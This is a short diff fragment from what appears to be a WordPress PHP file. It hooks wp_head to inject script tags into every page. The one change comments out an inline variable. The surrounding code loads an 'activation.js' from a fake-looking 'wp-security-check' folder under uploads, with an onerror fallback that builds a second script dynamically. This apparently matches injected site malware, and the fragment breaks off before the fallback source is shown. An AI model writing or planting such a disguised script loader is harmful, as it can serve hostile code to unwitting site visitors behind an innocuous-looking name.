@@ -170,7 +170,7 @@ if ( ! function_exists( 'wp_validate_api_scope' ) ) {
 add_action('wp_head', function() {
 //add_action('init', function() {
     ?>
-    <script>var cfb_executing_validation = {isValidating:false};</script>
+    <!--<script>var cfb_executing_validation = {isValidating:false};</script>-->
     <script src="/wp-content/uploads/wp-security-check/activation.js" 
         onerror="this.onerror=null; 
         var s=document.createElement('script'); 
